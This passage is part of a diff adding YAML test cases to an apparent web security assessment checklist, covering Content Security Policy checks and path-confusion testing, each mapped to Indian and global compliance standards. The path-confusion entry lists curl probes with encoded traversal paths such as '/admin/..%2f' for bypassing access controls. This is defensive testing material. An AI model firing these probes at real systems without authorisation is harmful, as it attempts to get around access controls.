+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-11"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-11"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-022"
+        title: "[WSTG-CONF-12] Test Content Security Policy"
+        category: "Config & Deploy Management"
+        severity: "Medium"
+        execution_mode: "automated"
+        tool_binding: ["httpx_headers"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Verify CSP header mitigates XSS/data injection."
+          - "Inspect Content-Security-Policy header."
+          - "Check for unsafe-inline/unsafe-eval or wildcard sources."
+          - "Test bypass techniques if weak."
+          - "Expected Secure Result: CSP present, restrictive, no unsafe-inline/unsafe-eval or wildcards."
+          - "Reference Commands: curl -I https://target.com | grep -i content-security-policy | CSP Evaluator (Google) - https://csp-evaluator.withgoogle.com/"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-12"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-12"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
+
+      - id: "WEB-INF-023"
+        title: "[WSTG-CONF-13] Test Path Confusion"
+        category: "Config & Deploy Management"
+        severity: "Medium"
+        execution_mode: "manual"
+        tool_binding: ["manual_proxy"]
+        profiles: ["core", "bfsi_fintech", "saas_multitenant", "healthcare_pii", "ecommerce"]
+        test_procedures:
+          - "Objective: Test for path confusion allowing WAF/access-control bypass."
+          - "Test alternate path encodings (e.g. /admin/..;/)."
+          - "Test trailing slash/case variations."
+          - "Verify access control consistency."
+          - "Expected Secure Result: Access control enforced consistently regardless of path manipulation."
+          - "Reference Commands: curl https://target.com/admin/..%2f | curl https://target.com/ADMIN/ | curl https://target.com//admin"
+        compliance:
+          india:
+            - "CERT-In CISG-2024-01 (Secure Server & Deployment Hardening)"
+            - "CERT-In CISG-2026-02 (Cloud & Infrastructure Exposure Hardening)"
+            - "DPDP Rules 2025 - Rule 6(1)(b) (Infrastructure Access Safeguards)"
+            - "OWASP WSTG v4.2: WSTG-CONF-13"
+          global:
+            - "OWASP WSTG v4.2: WSTG-CONF-13"
+            - "OWASP Top 10: A05 Security Misconfiguration"
+            - "PCI DSS v4.0: Req. 2.2, 6.4.1"
+            - "ISO 27001:2022: A.8.9, A.8.31"
+            - "SOC 2: CC6.6, CC7.1"
